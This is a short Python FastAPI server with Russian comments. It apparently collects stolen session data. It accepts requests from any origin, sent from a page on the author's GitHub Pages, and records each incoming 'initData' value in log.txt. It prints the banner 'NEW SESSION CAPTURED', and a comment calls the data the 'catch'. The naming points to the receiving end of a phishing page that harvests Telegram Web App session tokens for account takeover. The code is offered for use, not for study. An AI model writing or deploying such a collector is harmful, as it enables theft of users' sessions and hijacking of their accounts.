from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
import uvicorn

app = FastAPI()

# Разрешаем запросы с твоего GitHub Pages
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"], 
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.post("/receive")
async def receive_data(request: Request):
    # Получаем данные от index.html
    data = await request.json()
    
    # Сохраняем "улов" в файл (или выводим в консоль)
    print("--- НОВАЯ СЕССИЯ ЗАХВАЧЕНА ---")
    print(f"Данные: {data.get('initData')}")
    
    with open("log.txt", "a") as f:
        f.write(f"Session: {data.get('initData')}\n")
        
    return {"status": "ok"}

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)
